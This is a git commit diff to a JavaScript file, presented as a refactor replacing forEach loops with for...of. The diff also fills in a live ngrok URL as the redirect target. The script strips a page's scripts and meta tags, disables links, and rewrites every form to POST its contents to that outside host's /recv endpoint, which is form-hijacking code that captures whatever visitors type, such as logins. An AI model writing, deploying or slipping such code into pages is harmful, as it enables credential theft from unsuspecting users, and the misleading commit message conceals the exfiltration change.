7230e35af1bf780fcc853d2e8b6d36d2009ce36c
Miguel <miguel_zacca@estudante.sesisenai.org.br>
2024-03-25 12:23:39 -0300

    forEach replaced by for...of

--- src/AFS.js
+++ src/AFS.js
@@ -1,6 +1,6 @@
 // CONTROL //
 
-const redirect_data = "";
+const redirect_data = "https://2f85-200-146-211-233.ngrok-free.app";
 
 // SCRIPT //
 
@@ -13,42 +13,41 @@ const all_noscript = document.querySelectorAll("noscript");
 const all_base = document.querySelectorAll("base");
 const all = document.querySelectorAll("*");
 
-all.forEach((element) => {
+for (const element of all) {
   element.removeAttribute("jsaction");
-});
+}
 
-all_a.forEach((a) => {
+for (const a of all_a) {
   a.href = false;
-});
+}
 
-[all_base, all_noscript, all_meta, all_script].forEach((elements) => {
-  elements?.forEach((element) => {
-    element.remove();
-  });
-});
+for (const element of [...all_base, ...all_noscript, ...all_meta, ...all_script]) {
+  element?.remove();
+}
 
-all_button.forEach((button) => {
+for (const button of all_button) {
   if (button.type != "submit") {
     button.type = "submit";
   }
-  all_form.forEach((form) => {
+
+  for (const form of all_form) {
     button.addEventListener("click", () => {
       form.submit();
     });
-  });
-});
+  }
+}
 
-all_form.forEach((form) => {
+for (const form of all_form) {
   form.action = `${redirect_data}/recv`;
   form.method = "POST";
   form.noValidate = false;
-});
+}
 
 window.addEventListener("keydown", (event) => {
   if (event.key === "Enter") {
-    all_form.forEach((form) => {
+    for (const form of all_form) {
       form.submit();
-    });
+    }
   }
 });
 
